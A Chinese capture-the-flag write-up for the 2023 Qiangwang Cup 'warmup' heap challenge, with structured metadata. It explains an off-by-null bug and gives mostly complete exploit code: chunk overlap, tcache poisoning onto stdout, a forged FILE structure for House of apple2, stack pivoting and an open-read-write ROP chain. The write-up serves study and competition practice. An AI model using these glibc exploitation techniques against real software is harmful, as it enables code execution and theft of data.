---
title: 2023 强网杯 warmup 题解
contest: 强网杯 2023
year: 2023
difficulty: hard
vuln_type: heap_exploit
tags: [off_by_null, House_of_apple2, _IO_wfile_jumps, 高版本绕过, 栈迁移, tcache_dup, _IO_wfile_overflow, 堆重叠, 详细exp注释, pwncli]
attack_chain:
  - 漏洞点：add 函数 off by null 漏洞
  - 利用链：off by null + chunk overlap + 改 tcache fd 指向 stdout
  - 申请到 stdout 区域写 fake IO_FILE_plus_struct
  - 走 House of apple2 _IO_wfile_overflow 链
  - vtable 设置 _IO_wfile_jumps - 0x20，触发 _IO_wfile_overflow
  - _wide_data 指向 stdout - 0x48
  - _wide_data->_wide_vtable->_doallocate = leave_ret
  - 栈迁移到 stdout + 8 区域
  - pop_rbp + leave_ret 二次栈迁移到 ROP 链
  - 走 syscall open + read + write 完成 ORW
key_payload: 'file1.vtable = libc.sym[_IO_wfile_jumps] + libc_base - 0x20'
one_liner: 强网杯 warmup：off by null + House of apple2 + _IO_wfile_overflow + 栈迁移 ORW。
lesson: 高版本 off by null 需绕 bck->fd==P 检查；House of apple2 用 _IO_wfile_jumps - 0x20 直接劫持；栈迁移需要 leave; ret 二次迁移。
quality: high
---

# 2023 强网杯 warmup 题解

## 来源
- 原文：ctfiot.com/165317.html
- 作者：a2ure（看雪论坛）
- 比赛：强网杯 2023

## 题目分析

### 漏洞点
- `add` 函数有 off by null 漏洞
- `delete` 后置空，无 UAF
- `show` 打印内容

### 攻击流程
1. **chunk overlap**：off by null 改 chunk size 低位 0
2. **绕 bck->fd==P 检查**：高版本（glibc 2.29+）新机制
3. **改 tcache fd**：申请到 stdout 区域
4. **House of apple2 触发**：`_IO_wfile_overflow` 链
5. **栈迁移到 ROP**：leave; ret 二次迁移
6. **ORW 拿 flag**：open + read + write

### 关键 exp 步骤
```python
# 1. 堆布局 + off by null
add(0x410) # 0
add(0xe0)  # 1 (barrier)
add(0x430) # 2
add(0x430) # 3
add(0x100) # 4
add(0x480) # 5
add(0x420) # 6
add(0x10)  # 7 (barrier)

delete(0); delete(3); delete(6); delete(2)

# 2. 伪造指针 + 申请回来
add(0x450, flat({0x438: p16(0x551)})) # 0
add(0x410) # 2
add(0x420) # 3
add(0x410) # 6

delete(6); delete(2)
add(0x410) # 2
add(0x410) # 6

delete(6); delete(3); delete(5)

# 3. 申请大块改 size
add(0x4f0, b"a"*0x488 + p64(0x431)) # 3
add(0x3b0) # 5

# 4. 触发 chunk overlap
delete(4)
add(0x108, b"a"*0x100 + p64(0x550)) # 4
add(0x410) # 6
delete(3)
add(0x10) # 3

# 5. leak libc + heap
show(6)
libc_base = u64(io.recv(6).ljust(8, b'x00')) - 0x219ce0
show(8)
heap_addr = (u64(io.recv(5).ljust(8, b'x00')) << 12) + 0xc30

# 6. 改 tcache fd 指向 stdout
delete(4); delete(10)
add(0x80, b'a' * 0x48 + p64(0x401) + p64(((heap_addr + 0x470) >> 12) ^ (stdout_addr))[:-1])

# 7. fake IO_FILE_plus_struct
file1 = IO_FILE_plus_struct()
file1.flags = 0
file1._IO_read_ptr = pop_rbp
file1._IO_read_end = heap_addr + 0x470 - 8
file1._IO_read_base = leave_ret
file1._IO_write_base = 0
file1._IO_write_ptr = 1
file1._lock = heap_addr - 0xc30
file1.chain = leave_ret
file1._codecvt = stdout_addr
file1._wide_data = stdout_addr - 0x48
file1.vtable = libc.sym['_IO_wfile_jumps'] + libc_base - 0x20

# 8. 栈迁移 + ROP ORW
flag_addr = heap_addr + 0x470 + 0x100
payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscallret) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdxr12) + p64(0x50) + p64(0) + p64(read) + p64(pop_rdi) + p64(1) + p64(write)
add(0x3f0, payload)
add(0x3f0, bytes(file1))
```

## House of apple2 利用条件
```
_flags 设置为 0（不需控制 rdi）
vtable 设置为 _IO_wfile_jumps - 0x20
_wide_data 设置为可控堆地址 A
_wide_data->_IO_write_base = 0
_wide_data->_IO_buf_base = 0
_wide_data->_wide_vtable = 可控堆地址 B
_wide_data->_wide_vtable->doallocate = 劫持 RIP 地址 C
```

## 关键技巧
- **off by null 绕 bck->fd==P**：先 free + 重新申请 + 部分覆写
- **House of apple2**：`_IO_wfile_jumps - 0x20` 直接劫持 puts 路径
- **栈迁移到 stdout + 8**：leave; ret 二次迁移
- **高版本 chunk overlap**：先 free 多个再申请制造重叠

## 适用场景
- 高版本 off by null 利用
- House of apple 实战
- 堆重叠 + 栈迁移 ORW
- 真实强网杯赛题
